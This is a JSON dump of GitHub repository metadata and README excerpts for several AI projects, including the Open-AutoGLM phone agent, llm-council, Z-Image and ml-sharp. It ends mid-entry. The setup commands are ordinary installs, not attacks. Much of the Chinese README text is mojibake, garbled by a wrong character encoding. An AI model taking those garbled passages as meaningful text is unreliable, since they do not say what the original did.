[
  {
    "basic_info": {
      "name": "Open-AutoGLM",
      "full_name": "zai-org/Open-AutoGLM",
      "owner": "zai-org",
      "description": "An Open Phone Agent Model & Framework. Unlocking the AI Phone for Everyone",
      "url": "https://github.com/zai-org/Open-AutoGLM",
      "clone_url": "https://github.com/zai-org/Open-AutoGLM.git",
      "ssh_url": "git@github.com:zai-org/Open-AutoGLM.git",
      "homepage": "https://autoglm.z.ai/blog",
      "created_at": "2025-12-08T09:23:44Z",
      "updated_at": "2025-12-21T02:54:16Z",
      "pushed_at": "2025-12-19T11:00:20Z"
    },
    "stats": {
      "stars": 18241,
      "forks": 2857,
      "watchers": 18241,
      "open_issues": 145,
      "size": 3304
    },
    "tech_info": {
      "language": "Python",
      "languages": {
        "Python": 265241
      },
      "license": "Apache License 2.0",
      "topics": [
        "agent",
        "phone-use-agent"
      ]
    },
    "content": {
      "readme": "# Open-AutoGLM\n\n[Readme in English](README_en.md)\n\n<div align=\"center\">\n<img src=resources/logo.svg width=\"20%\"/>\n</div>\n<p align=\"center\">\n    ğŸ‘‹ åŠ å…¥æˆ‘ä»¬çš„ <a href=\"resources/WECHAT.md\" target=\"_blank\">å¾®ä¿¡</a> ç¤¾åŒº\n</p>\n<p align=\"center\">\n    ğŸ¤ è¿›ä¸€æ­¥åœ¨æˆ‘ä»¬çš„äº§å“ <a href=\"https://autoglm.zhipuai.cn/autotyper/\" target=\"_blank\">æ™ºè°± AI è¾“å…¥æ³•</a> ä½“éªŒâ€œç”¨å˜´å‘æŒ‡ä»¤â€\n</p\n><p align=\"center\">\n    <a href=\"https://mp.weixin.qq.com/s/wRp22dmRVF23ySEiATiWIQ\" target=\"_blank\">AutoGLM å®æˆ˜æ´¾</a> å¼€å‘è€…æ¿€åŠ±æ´»åŠ¨ç«çƒ­è¿›è¡Œä¸­ï¼Œè·‘é€šã€äºŒåˆ›å³å¯ç“œåˆ†æ•°ä¸‡å…ƒç°é‡‘å¥–æ± ï¼æˆæœæäº¤ ğŸ‘‰ <a href=\"https://zhipu-ai.feishu.cn/share/base/form/shrcnE3ZuPD5tlOyVJ7d5Wtir8c?from=navigation\" target=\"_blank\">å…¥å£</a>\n</p>\n\n## æ‡’äººç‰ˆå¿«é€Ÿå®‰è£…\n\nä½ å¯ä»¥ä½¿ç”¨Claude Codeï¼Œé…ç½® [GLM Coding Plan](https://bigmodel.cn/glm-coding) åï¼Œè¾“å…¥ä»¥ä¸‹æç¤ºè¯ï¼Œå¿«é€Ÿéƒ¨ç½²æœ¬é¡¹ç›®ã€‚\n\n```\nè®¿é—®æ–‡æ¡£ï¼Œä¸ºæˆ‘å®‰è£… AutoGLM\nhttps://raw.githubusercontent.com/zai-org/Open-AutoGLM/refs/heads/main/README.md\n```\n\n## é¡¹ç›®ä»‹ç»\n\nPhone Agent æ˜¯ä¸€ä¸ªåŸºäº AutoGLM æ„å»ºçš„æ‰‹æœºç«¯æ™ºèƒ½åŠ©ç†æ¡†æ¶ï¼Œå®ƒèƒ½å¤Ÿä»¥å¤šæ¨¡æ€æ–¹å¼ç†è§£æ‰‹æœºå±å¹•å†…å®¹ï¼Œå¹¶é€šè¿‡è‡ªåŠ¨åŒ–æ“ä½œå¸®åŠ©ç”¨æˆ·å®Œæˆä»»åŠ¡ã€‚ç³»ç»Ÿé€šè¿‡\nADB(Android Debug Bridge)æ¥æ§åˆ¶è®¾å¤‡ï¼Œä»¥è§†è§‰è¯­è¨€æ¨¡å‹è¿›è¡Œå±å¹•æ„ŸçŸ¥ï¼Œå†ç»“åˆæ™ºèƒ½è§„åˆ’èƒ½åŠ›ç”Ÿæˆå¹¶æ‰§è¡Œæ“ä½œæµç¨‹ã€‚ç”¨æˆ·åªéœ€ç”¨è‡ªç„¶è¯­è¨€æè¿°éœ€æ±‚ï¼Œå¦‚â€œæ‰“å¼€å°çº¢ä¹¦æœç´¢ç¾é£Ÿâ€ï¼ŒPhone\nAgent å³å¯è‡ªåŠ¨è§£ææ„å›¾ã€ç†è§£å½“å‰ç•Œé¢ã€è§„åˆ’ä¸‹ä¸€æ­¥åŠ¨ä½œå¹¶å®Œæˆæ•´ä¸ªæµç¨‹ã€‚ç³»ç»Ÿè¿˜å†…ç½®æ•æ„Ÿæ“ä½œç¡®è®¤æœºåˆ¶ï¼Œå¹¶æ”¯æŒåœ¨ç™»å½•æˆ–éªŒè¯ç åœºæ™¯ä¸‹è¿›è¡Œäººå·¥æ¥ç®¡ã€‚åŒæ—¶ï¼Œå®ƒæä¾›è¿œç¨‹\nADB è°ƒè¯•èƒ½åŠ›ï¼Œå¯é€šè¿‡ WiFi æˆ–ç½‘ç»œè¿æ¥è®¾å¤‡ï¼Œå®ç°çµæ´»çš„è¿œç¨‹æ§åˆ¶ä¸å¼€å‘ã€‚\n\n> âš ï¸\n> æœ¬é¡¹ç›®ä»…ä¾›ç ”ç©¶å’Œå­¦ä¹ ä½¿ç”¨ã€‚ä¸¥ç¦ç”¨äºéæ³•è·å–ä¿¡æ¯ã€å¹²æ‰°ç³»ç»Ÿæˆ–ä»»ä½•è¿æ³•æ´»åŠ¨ã€‚è¯·ä»”ç»†å®¡é˜… [ä½¿ç”¨æ¡æ¬¾](resources/privacy_policy.txt)ã€‚\n\n## æ¨¡å‹ä¸‹è½½åœ°å€\n\n| Model                         | Download Links                                                                                                                                                         |\n|-------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| AutoGLM-Phone-9B              | [ğŸ¤— Hugging Face](https://huggingface.co/zai-org/AutoGLM-Phone-9B)<br>[ğŸ¤– ModelScope](https://modelscope.cn/models/ZhipuAI/AutoGLM-Phone-9B)                           |\n| AutoGLM-Phone-9B-Multilingual | [ğŸ¤— Hugging Face](https://huggingface.co/zai-org/AutoGLM-Phone-9B-Multilingual)<br>[ğŸ¤– ModelScope](https://modelscope.cn/models/ZhipuAI/AutoGLM-Phone-9B-Multilingual) |\n\nå…¶ä¸­ï¼Œ`AutoGLM-Phone-9B` æ˜¯é’ˆå¯¹ä¸­æ–‡æ‰‹æœºåº”ç”¨ä¼˜åŒ–çš„æ¨¡å‹ï¼Œè€Œ `AutoGLM-Phone-9B-Multilingual` æ”¯æŒè‹±è¯­åœºæ™¯ï¼Œé€‚ç”¨äºåŒ…å«è‹±æ–‡ç­‰å…¶ä»–è¯­è¨€å†…å®¹çš„åº”ç”¨ã€‚\n\n## Android ç¯å¢ƒå‡†å¤‡\n\n### 1. Python ç¯å¢ƒ\n\nå»ºè®®ä½¿ç”¨ Python 3.10 åŠä»¥ä¸Šç‰ˆæœ¬ã€‚\n\n### 2. æ‰‹æœºè°ƒè¯•å‘½ä»¤è¡Œå·¥å…·\n\næ ¹æ®ä½ çš„è®¾å¤‡ç±»å‹é€‰æ‹©ç›¸åº”çš„å·¥å…·ï¼š\n\n#### å¯¹äº Android è®¾å¤‡ - ä½¿ç”¨ ADB\n\n1. ä¸‹è½½å®˜æ–¹ ADB [å®‰è£…åŒ…](https://developer.android.com/tools/releases/platform-tools?hl=zh-cn)ï¼Œå¹¶è§£å‹åˆ°è‡ªå®šä¹‰è·¯å¾„\n2. é…ç½®ç¯å¢ƒå˜é‡\n\n- MacOS é…ç½®æ–¹æ³•ï¼šåœ¨ `Terminal` æˆ–è€…ä»»ä½•å‘½ä»¤è¡Œå·¥å…·é‡Œ\n\n  ```bash\n  # å‡è®¾è§£å‹åçš„ç›®å½•ä¸º ~/Downloads/platform-toolsã€‚å¦‚æœä¸æ˜¯è¯·è‡ªè¡Œè°ƒæ•´å‘½ä»¤ã€‚\n  export PATH=${PATH}:~/Downloads/platform-tools\n  ```\n\n- Windows é…ç½®æ–¹æ³•ï¼šå¯å‚è€ƒ [ç¬¬ä¸‰æ–¹æ•™ç¨‹](https://blog.csdn.net/x2584179909/article/details/108319973) è¿›è¡Œé…ç½®ã€‚\n\n#### å¯¹äºé¸¿è’™è®¾å¤‡ (HarmonyOS NEXTç‰ˆæœ¬ä»¥ä¸Š) - ä½¿ç”¨ HDC\n\n1. ä¸‹è½½ HDC å·¥å…·ï¼š\n   - ä» [HarmonyOS SDK](https://developer.huawei.com/consumer/cn/download/) ä¸‹è½½\n2. é…ç½®ç¯å¢ƒå˜é‡\n\n- MacOS/Linux é…ç½®æ–¹æ³•ï¼š\n\n  ```bash\n  # å‡è®¾è§£å‹åçš„ç›®å½•ä¸º ~/Downloads/harmonyos-sdk/toolchainsã€‚è¯·æ ¹æ®å®é™…è·¯å¾„è°ƒæ•´ã€‚\n  export PATH=${PATH}:~/Downloads/harmonyos-sdk/toolchains\n  ```\n\n- Windows é…ç½®æ–¹æ³•ï¼šå°† HDC å·¥å…·æ‰€åœ¨ç›®å½•æ·»åŠ åˆ°ç³»ç»Ÿ PATH ç¯å¢ƒå˜é‡\n\n### 3. Android 7.0+ æˆ– HarmonyOS è®¾å¤‡ï¼Œå¹¶å¯ç”¨ `å¼€å‘è€…æ¨¡å¼` å’Œ `USB è°ƒè¯•`\n\n1. å¼€å‘è€…æ¨¡å¼å¯ç”¨ï¼šé€šå¸¸å¯ç”¨æ–¹æ³•æ˜¯ï¼Œæ‰¾åˆ° `è®¾ç½®-å…³äºæ‰‹æœº-ç‰ˆæœ¬å·` ç„¶åè¿ç»­å¿«é€Ÿç‚¹å‡» 10\n   æ¬¡å·¦å³ï¼Œç›´åˆ°å¼¹å‡ºå¼¹çª—æ˜¾ç¤ºâ€œå¼€å‘è€…æ¨¡å¼å·²å¯ç”¨â€ã€‚ä¸åŒæ‰‹æœºä¼šæœ‰äº›è®¸å·®åˆ«ï¼Œå¦‚æœæ‰¾ä¸åˆ°ï¼Œå¯ä»¥ä¸Šç½‘æœç´¢ä¸€ä¸‹æ•™ç¨‹ã€‚\n2. USB è°ƒè¯•å¯ç”¨ï¼šå¯ç”¨å¼€å‘è€…æ¨¡å¼ä¹‹åï¼Œä¼šå‡ºç° `è®¾ç½®-å¼€å‘è€…é€‰é¡¹-USB è°ƒè¯•`ï¼Œå‹¾é€‰å¯ç”¨\n3. éƒ¨åˆ†æœºå‹åœ¨è®¾ç½®å¼€å‘è€…é€‰é¡¹ä»¥å, å¯èƒ½éœ€è¦é‡å¯è®¾å¤‡æ‰èƒ½ç”Ÿæ•ˆ. å¯ä»¥æµ‹è¯•ä¸€ä¸‹: å°†æ‰‹æœºç”¨USBæ•°æ®çº¿è¿æ¥åˆ°ç”µè„‘å, `adb devices`\n   æŸ¥çœ‹æ˜¯å¦æœ‰è®¾å¤‡ä¿¡æ¯, å¦‚æœæ²¡æœ‰è¯´æ˜è¿æ¥å¤±è´¥.\n\n**è¯·åŠ¡å¿…ä»”ç»†æ£€æŸ¥ç›¸å…³æƒé™**\n\n![æƒé™](resources/screenshot-20251209-181423.png)\n\n### 4. å®‰è£… ADB Keyboard(ä»… Android è®¾å¤‡éœ€è¦ï¼Œç”¨äºæ–‡æœ¬è¾“å…¥)\n\n**æ³¨æ„ï¼šé¸¿è’™è®¾å¤‡ä½¿ç”¨åŸç”Ÿè¾“å…¥æ–¹æ³•ï¼Œæ— éœ€å®‰è£… ADB Keyboardã€‚**\n\nå¦‚æœä½ ä½¿ç”¨çš„æ˜¯ Android è®¾å¤‡ï¼š\n\nä¸‹è½½ [å®‰è£…åŒ…](https://github.com/senzhk/ADBKeyBoard/blob/master/ADBKeyboard.apk) å¹¶åœ¨å¯¹åº”çš„å®‰å“è®¾å¤‡ä¸­è¿›è¡Œå®‰è£…ã€‚\næ³¨æ„ï¼Œå®‰è£…å®Œæˆåè¿˜éœ€è¦åˆ° `è®¾ç½®-è¾“å…¥æ³•` æˆ–è€… `è®¾ç½®-é”®ç›˜åˆ—è¡¨` ä¸­å¯ç”¨ `ADB Keyboard` æ‰èƒ½ç”Ÿæ•ˆ(æˆ–ä½¿ç”¨å‘½ä»¤`adb shell ime enable com.android.adbkeyboard/.AdbIME`[How-to-use](https://github.com/senzhk/ADBKeyBoard/blob/master/README.md#how-to-use))\n\n## iPhone ç¯å¢ƒå‡†å¤‡\n\n### 1. Python ç¯å¢ƒ\n\nå»ºè®®ä½¿ç”¨ Python 3.10 åŠä»¥ä¸Šç‰ˆæœ¬ã€‚\n\n### 2. è®¾ç½® WebDriverAgent \n\nWebDriverAgent æ˜¯ iOS è‡ªåŠ¨åŒ–çš„æ ¸å¿ƒç»„ä»¶,éœ€è¦åœ¨ iOS è®¾å¤‡ä¸Šè¿è¡Œã€‚\n\næ³¨æ„ï¼šéœ€è¦æå‰å®‰è£…å¥½Xcodeã€å¹¶æ³¨å†Œå¥½è‹¹æœå¼€å‘è€…è´¦å·ï¼ˆä¸éœ€è¦ä»˜è´¹ï¼‰\n\n#### 1. å…‹éš† WebDriverAgent\n\n```bash\n\ngit clone https://github.com/appium/WebDriverAgent.git\ncd WebDriverAgent\n```\nåœ¨ Xcode ä¸­æ‰“å¼€WebDriverAgent.xcodeproj\n\n#### 2. è®¾ç½® Signing & Capabilities\n\n![è®¾ç½®ç­¾å](resources/setup-xcode-wda.png)\n\næŠŠBundle IDæ”¹æˆ YOUR_NAME.WebDriverAgentRunnerã€‚\n\n#### 3. å¼€å§‹UIæµ‹è¯•\n\néœ€è¦åœ¨Finderå‹¾é€‰è¿‡â€œåœ¨WiFiä¸­æ˜¾ç¤ºè¿™å°iPhoneâ€ï¼Œä¸”Macä¸iPhoneå¤„äºåŒä¸€WiFiç½‘ç»œä¹‹ä¸‹ï¼Œå¯ä»¥ä¸ç”¨è¿æ¥æ•°æ®çº¿ï¼Œå³å¯åœ¨è®¾å¤‡ä¸­é€‰æ‹©åˆ°ã€‚\n\n**æ³¨æ„ï¼š** ä¸å»ºè®®æ’æ•°æ®çº¿è¿è¡Œï¼Œå› ä¸ºæ’æ•°æ®çº¿è¿˜å¿…é¡»è¦åŒæ—¶è¿è¡Œiproxyæ‰å¯ä»¥æŠŠç«¯å£æ˜ å°„å‡ºæ¥ï¼Œä¸åŠç›´æ¥WiFiè¿è¡Œç¨³å®šã€‚\n\nå…ˆä»é¡¹ç›®Targeté€‰æ‹©WebDriverAgentRunnerï¼Œç„¶åå†é€‰æ‹©ä½ çš„è®¾å¤‡ã€‚\n\n![é€‰æ‹©è®¾å¤‡](resources/select-your-iphone-device.png)\n\né€‰å¥½åï¼Œé•¿æŒ‰\"â–¶ï¸\"è¿è¡ŒæŒ‰é’®é€‰æ‹©â€œTestâ€åå¼€å§‹ç¼–è¯‘å¹¶éƒ¨ç½²åˆ°ä½ çš„iPhoneä¸Šã€‚\n\n![ä¿¡ä»»è®¾å¤‡](resources/start-wda-testing.png)\n\nè¿™æ—¶éœ€è¦ä½ åœ¨iPhoneä¸Šè¾“å…¥è§£é”å¯†ç ï¼Œåœ¨è®¾ç½® -> é€šç”¨ -> VPNä¸è®¾å¤‡ç®¡ç† ä¸­ä¿¡ä»»å¼€å‘è€…Appï¼Œè¿˜éœ€è¦åœ¨ è®¾ç½® -> å¼€å‘è€…  ä¸­ï¼Œæ‰“å¼€UIè‡ªåŠ¨åŒ–è®¾ç½®ã€‚\n\n\n\n![ä¿¡ä»»è®¾å¤‡](resources/trust-dev-app.jpg)\n\n![å¯ç”¨UIè‡ªåŠ¨åŒ–](resources/enable-ui-automation.jpg)\n\n## éƒ¨ç½²å‡†å¤‡å·¥ä½œ\n\n### 1. å®‰è£…ä¾èµ–\n\n```bash\npip install -r requirements.txt \npip install -e .\n```\n\n### 2. é…ç½® ADB æˆ– HDC\n\n#### å¯¹äº Android è®¾å¤‡\n\nç¡®è®¤ **USBæ•°æ®çº¿å…·æœ‰æ•°æ®ä¼ è¾“åŠŸèƒ½**, è€Œä¸æ˜¯ä»…æœ‰å……ç”µåŠŸèƒ½\n\nç¡®ä¿å·²å®‰è£… ADB å¹¶ä½¿ç”¨ **USBæ•°æ®çº¿** è¿æ¥è®¾å¤‡ï¼š\n\n```bash\n# æ£€æŸ¥å·²è¿æ¥çš„è®¾å¤‡\nadb devices\n\n# è¾“å‡ºç»“æœåº”æ˜¾ç¤ºä½ çš„è®¾å¤‡ï¼Œå¦‚ï¼š\n# List of devices attached\n# emulator-5554   device\n",
      "default_branch": "main"
    },
    "fetched_at": "2025-12-21T02:54:24.349354"
  },
  {
    "basic_info": {
      "name": "llm-council",
      "full_name": "karpathy/llm-council",
      "owner": "karpathy",
      "description": "LLM Council works together to answer your hardest questions",
      "url": "https://github.com/karpathy/llm-council",
      "clone_url": "https://github.com/karpathy/llm-council.git",
      "ssh_url": "git@github.com:karpathy/llm-council.git",
      "homepage": "",
      "created_at": "2025-11-22T23:24:14Z",
      "updated_at": "2025-12-21T02:48:14Z",
      "pushed_at": "2025-11-22T23:35:21Z"
    },
    "stats": {
      "stars": 11728,
      "forks": 2170,
      "watchers": 11728,
      "open_issues": 76,
      "size": 262
    },
    "tech_info": {
      "language": "Python",
      "languages": {
        "Python": 24729,
        "JavaScript": 20694,
        "CSS": 9346,
        "Shell": 625,
        "HTML": 357
      },
      "license": null,
      "topics": []
    },
    "content": {
      "readme": "# LLM Council\n\n![llmcouncil](header.jpg)\n\nThe idea of this repo is that instead of asking a question to your favorite LLM provider (e.g. OpenAI GPT 5.1, Google Gemini 3.0 Pro, Anthropic Claude Sonnet 4.5, xAI Grok 4, eg.c), you can group them into your \"LLM Council\". This repo is a simple, local web app that essentially looks like ChatGPT except it uses OpenRouter to send your query to multiple LLMs, it then asks them to review and rank each other's work, and finally a Chairman LLM produces the final response.\n\nIn a bit more detail, here is what happens when you submit a query:\n\n1. **Stage 1: First opinions**. The user query is given to all LLMs individually, and the responses are collected. The individual responses are shown in a \"tab view\", so that the user can inspect them all one by one.\n2. **Stage 2: Review**. Each individual LLM is given the responses of the other LLMs. Under the hood, the LLM identities are anonymized so that the LLM can't play favorites when judging their outputs. The LLM is asked to rank them in accuracy and insight.\n3. **Stage 3: Final response**. The designated Chairman of the LLM Council takes all of the model's responses and compiles them into a single final answer that is presented to the user.\n\n## Vibe Code Alert\n\nThis project was 99% vibe coded as a fun Saturday hack because I wanted to explore and evaluate a number of LLMs side by side in the process of [reading books together with LLMs](https://x.com/karpathy/status/1990577951671509438). It's nice and useful to see multiple responses side by side, and also the cross-opinions of all LLMs on each other's outputs. I'm not going to support it in any way, it's provided here as is for other people's inspiration and I don't intend to improve it. Code is ephemeral now and libraries are over, ask your LLM to change it in whatever way you like.\n\n## Setup\n\n### 1. Install Dependencies\n\nThe project uses [uv](https://docs.astral.sh/uv/) for project management.\n\n**Backend:**\n```bash\nuv sync\n```\n\n**Frontend:**\n```bash\ncd frontend\nnpm install\ncd ..\n```\n\n### 2. Configure API Key\n\nCreate a `.env` file in the project root:\n\n```bash\nOPENROUTER_API_KEY=sk-or-v1-...\n```\n\nGet your API key at [openrouter.ai](https://openrouter.ai/). Make sure to purchase the credits you need, or sign up for automatic top up.\n\n### 3. Configure Models (Optional)\n\nEdit `backend/config.py` to customize the council:\n\n```python\nCOUNCIL_MODELS = [\n    \"openai/gpt-5.1\",\n    \"google/gemini-3-pro-preview\",\n    \"anthropic/claude-sonnet-4.5\",\n    \"x-ai/grok-4\",\n]\n\nCHAIRMAN_MODEL = \"google/gemini-3-pro-preview\"\n```\n\n## Running the Application\n\n**Option 1: Use the start script**\n```bash\n./start.sh\n```\n\n**Option 2: Run manually**\n\nTerminal 1 (Backend):\n```bash\nuv run python -m backend.main\n```\n\nTerminal 2 (Frontend):\n```bash\ncd frontend\nnpm run dev\n```\n\nThen open http://localhost:5173 in your browser.\n\n## Tech Stack\n\n- **Backend:** FastAPI (Python 3.10+), async httpx, OpenRouter API\n- **Frontend:** React + Vite, react-markdown for rendering\n- **Storage:** JSON files in `data/conversations/`\n- **Package Management:** uv for Python, npm for JavaScript\n",
      "default_branch": "master"
    },
    "fetched_at": "2025-12-21T02:54:25.468233"
  },
  {
    "basic_info": {
      "name": "Z-Image",
      "full_name": "Tongyi-MAI/Z-Image",
      "owner": "Tongyi-MAI",
      "description": null,
      "url": "https://github.com/Tongyi-MAI/Z-Image",
      "clone_url": "https://github.com/Tongyi-MAI/Z-Image.git",
      "ssh_url": "git@github.com:Tongyi-MAI/Z-Image.git",
      "homepage": null,
      "created_at": "2025-11-26T09:18:10Z",
      "updated_at": "2025-12-21T02:34:26Z",
      "pushed_at": "2025-12-14T15:22:02Z"
    },
    "stats": {
      "stars": 7496,
      "forks": 443,
      "watchers": 7496,
      "open_issues": 60,
      "size": 57188
    },
    "tech_info": {
      "language": "Python",
      "languages": {
        "Python": 98875
      },
      "license": "Apache License 2.0",
      "topics": []
    },
    "content": {
      "readme": "<h1 align=\"center\">âš¡ï¸- Image<br><sub><sup>An Efficient Image Generation Foundation Model with Single-Stream Diffusion Transformer</sup></sub></h1>\n\n<div align=\"center\">\n\n[![Official Site](https://img.shields.io/badge/Official%20Site-333399.svg?logo=homepage)](https://tongyi-mai.github.io/Z-Image-blog/)&#160;\n[![Hugging Face](https://img.shields.io/badge/%F0%9F%A4%97%20Checkpoint-Z--Image--Turbo-yellow)](https://huggingface.co/Tongyi-MAI/Z-Image-Turbo)&#160;\n[![Hugging Face](https://img.shields.io/badge/%F0%9F%A4%97%20Online_Demo-Z--Image--Turbo-blue)](https://huggingface.co/spaces/Tongyi-MAI/Z-Image-Turbo)&#160;\n[![ModelScope Model](https://img.shields.io/badge/ğŸ¤–%20Checkpoint-Z--Image--Turbo-624aff)](https://www.modelscope.cn/models/Tongyi-MAI/Z-Image-Turbo)&#160;\n[![ModelScope Space](https://img.shields.io/badge/ğŸ¤–%20Online_Demo-Z--Image--Turbo-17c7a7)](https://www.modelscope.cn/aigc/imageGeneration?tab=advanced&versionId=469191&modelType=Checkpoint&sdVersion=Z_IMAGE_TURBO&modelUrl=modelscope%253A%252F%252FTongyi-MAI%252FZ-Image-Turbo%253Frevision%253Dmaster%7D%7BOnline)&#160;\n[![Art Gallery PDF](https://img.shields.io/badge/%F0%9F%96%BC%20Art_Gallery-PDF-ff69b4)](assets/Z-Image-Gallery.pdf)&#160;\n[![Web Art Gallery](https://img.shields.io/badge/%F0%9F%8C%90%20Web_Art_Gallery-online-00bfff)](https://modelscope.cn/studios/Tongyi-MAI/Z-Image-Gallery/summary)&#160;\n<a href=\"https://arxiv.org/abs/2511.22699\" target=\"_blank\"><img src=\"https://img.shields.io/badge/Report-b5212f.svg?logo=arxiv\" height=\"21px\"></a>\n\n\nWelcome to the official repository for the Z-Imageï¼ˆé€ ç›¸ï¼‰project!\n\n</div>\n\n\n\n## âœ¨ Z-Image\n\nZ-Image is a powerful and highly efficient image generation model with **6B** parameters. Currently there are three variants:\n\n- ğŸš€ **Z-Image-Turbo** â€“ A distilled version of Z-Image that matches or exceeds leading competitors with only **8 NFEs** (Number of Function Evaluations). It offers **âš¡ï¸sub-second inference latencyâš¡ï¸** on enterprise-grade H800 GPUs and fits comfortably within **16G VRAM consumer devices**. It excels in photorealistic image generation, bilingual text rendering (English & Chinese), and robust instruction adherence.\n\n- ğŸ§± **Z-Image-Base** â€“ The non-distilled foundation model. By releasing this checkpoint, we aim to unlock the full potential for community-driven fine-tuning and custom development.\n\n- âœï¸ **Z-Image-Edit** â€“ A variant fine-tuned on Z-Image specifically for image editing tasks. It supports creative image-to-image generation with impressive instruction-following capabilities, allowing for precise edits based on natural language prompts.\n\n### ğŸ“£ News\n\n*   **[2025-12-08]** ğŸ† Z-Image-Turbo ranked 8th overall on the **Artificial Analysis Text-to-Image Leaderboard**, making it the ğŸ¥‡ <strong style=\"color: #FFC300;\">#1 open-source model</strong>! [Check out the full leaderboard](https://artificialanalysis.ai/image/leaderboard/text-to-image).\n*   **[2025-12-01]** ğŸ‰ Our technical report for Z-Image is now available on [arXiv](https://arxiv.org/abs/2511.22699).\n*   **[2025-11-26]** ğŸ”¥ **Z-Image-Turbo is released!** We have released the model checkpoint on [Hugging Face](https://huggingface.co/Tongyi-MAI/Z-Image-Turbo) and [ModelScope](https://www.modelscope.cn/models/Tongyi-MAI/Z-Image-Turbo). Try our [online demo](https://huggingface.co/spaces/Tongyi-MAI/Z-Image-Turbo)!\n\n### ğŸ“¥ Model Zoo\n\n| Model | Hugging Face                                                                                                                                                                                                                                                                                                              | ModelScope                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |\n| :--- |:--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| **Z-Image-Turbo** | [![Hugging Face](https://img.shields.io/badg",
      "default_branch": "main"
    },
    "fetched_at": "2025-12-21T02:54:26.572180"
  },
  {
    "basic_info": {
      "name": "ml-sharp",
      "full_name": "apple/ml-sharp",
      "owner": "apple",
      "description": "Sharp Monocular View Synthesis in Less Than a Second",
      "url": "https://github.com/apple/ml-sharp",
      "clone_url": "https://github.com/apple/ml-sharp.git",
      "ssh_url": "git@github.com:apple/ml-sharp.git",
      "homepage": "https://apple.github.io/ml-sharp/",
      "created_at": "2025-12-12T03:46:09Z",
      "updated_at": "2025-12-21T02:39:45Z",
      "pushed_at": "2025-12-19T05:14:10Z"
    },
    "stats": {
      "stars": 4275,
      "forks": 259,
      "watchers": 4275,
      "open_issues": 27,
      "size": 189483
    },
    "tech_info": {
      "language": "Python",
      "languages": {
        "Python": 186219
      },
      "license": "Other",
      "topics": []
    },
    "content": {
      "readme": "# Sharp Monocular View Synthesis in Less Than a Second\n\n[![Project Page](https://img.shields.io/badge/Project-Page-green)](https://apple.github.io/ml-sharp/)\n[![arXiv](https://img.shields.io/badge/arXiv-2512.10685-b31b1b.svg)](https://arxiv.org/abs/2512.10685)\n\nThis software project accompanies the research paper: _Sharp Monocular View Synthesis in Less Than a Second_\nby _Lars Mescheder, Wei Dong, Shiwei Li, Xuyang Bai, Marcel Santos, Peiyun Hu, Bruno Lecouat, Mingmin Zhen, AmaÃ«l Delaunoy,\nTian Fang, Yanghai Tsin, Stephan Richter and Vladlen Koltun_.\n\n![](data/teaser.jpg)\n\nWe present SHARP, an approach to photorealistic view synthesis from a single image. Given a single photograph, SHARP regresses the parameters of a 3D Gaussian representation of the depicted scene. This is done in less than a second on a standard GPU via a single feedforward pass through a neural network. The 3D Gaussian representation produced by SHARP can then be rendered in real time, yielding high-resolution photorealistic images for nearby views. The representation is metric, with absolute scale, supporting metric camera movements. Experimental results demonstrate that SHARP delivers robust zero-shot generalization across datasets. It sets a new state of the art on multiple datasets, reducing LPIPS by 25â€“34% and DISTS by 21â€“43% versus the best prior model, while lowering the synthesis time by three orders of magnitude.\n\n## Getting started\n\nWe recommend to first create a python environment:\n\n```\nconda create -n sharp python=3.13\n```\n\nAfterwards, you can install the project using\n\n```\npip install -r requirements.txt\n```\n\nTo test the installation, run\n\n```\nsharp --help\n```\n\n## Using the CLI\n\nTo run prediction:\n\n```\nsharp predict -i /path/to/input/images -o /path/to/output/gaussians\n```\n\nThe model checkpoint will be downloaded automatically on first run and cached locally at `~/.cache/torch/hub/checkpoints/`.\n\nAlternatively, you can download the model directly:\n\n```\nwget https://ml-site.cdn-apple.com/models/sharp/sharp_2572gikvuh.pt\n```\n\nTo use a manually downloaded checkpoint, specify it with the `-c` flag:\n\n```\nsharp predict -i /path/to/input/images -o /path/to/output/gaussians -c sharp_2572gikvuh.pt\n```\n\nThe results will be 3D gaussian splats (3DGS) in the output folder. The 3DGS `.ply` files are compatible to various public 3DGS renderers. We follow the OpenCV coordinate convention (x right, y down, z forward). The 3DGS scene center is roughly at (0, 0, +z). When dealing with 3rdparty renderers, please scale and rotate to re-center the scene accordingly.\n\n### Rendering trajectories (CUDA GPU only)\n\nAdditionally you can render videos with a camera trajectory. While the gaussians prediction works for all CPU, CUDA, and MPS, rendering videos via the `--render` option currently requires a CUDA GPU. The gsplat renderer takes a while to initialize at the first launch.\n\n```\nsharp predict -i /path/to/input/images -o /path/to/output/gaussians --render\n\n# Or from the intermediate gaussians:\nsharp render -i /path/to/output/gaussians -o /path/to/output/renderings\n```\n\n## Evaluation\n\nPlease refer to the paper for both quantitative and qualitative evaluations.\nAdditionally, please check out this [qualitative examples page](https://apple.github.io/ml-sharp/) containing several video comparisons against related work.\n\n## Citation\n\nIf you find our work useful, please cite the following paper:\n\n```bibtex\n@inproceedings{Sharp2025:arxiv,\n  title      = {Sharp Monocular View Synthesis in Less Than a Second},\n  author     = {Lars Mescheder and Wei Dong and Shiwei Li and Xuyang Bai and Marcel Santos and Peiyun Hu and Bruno Lecouat and Mingmin Zhen and Ama\\\"{e}l Delaunoy and Tian Fang and Yanghai Tsin and Stephan R. Richter and Vladlen Koltun},\n  journal    = {arXiv preprint arXiv:2512.10685},\n  year       = {2025},\n  url        = {https://arxiv.org/abs/2512.10685},\n}\n```\n\n## Acknowledgements\n\nOur codebase is built using multiple opensource contributions, please see [ACKNOWLEDGEMENTS](ACKNOWLEDGEMENTS) for more details.\n\n## License\n\nPlease check out the repository [LICENSE](LICENSE) before using the provided code and\n[LICENSE_MODEL](LICENSE_MODEL) for the released models.\n",
      "default_branch": "main"
    },
    "fetched_at": "2025-12-21T02:54:27.686538"
  },
  {
    "basic_info": {
      "name": "RedInk",
      "full_name": "HisMax/RedInk",
      "owner": "HisMax",
      "description": "çº¢å¢¨ - åŸºäºğŸŒNano Banana ProğŸŒ çš„ä¸€ç«™å¼å°çº¢ä¹¦å›¾æ–‡ç”Ÿæˆå™¨ ã€Šä¸€å¥è¯ä¸€å¼ å›¾ç‰‡ç”Ÿæˆå°çº¢ä¹¦å›¾æ–‡ã€‹ Red Ink - A one-stop Xiaohongshu image-and-text generator based on the ğŸŒNano Banana ProğŸŒ, \"One Sentence, One Image: Generate Xiaohongshu Text and Images.\"",
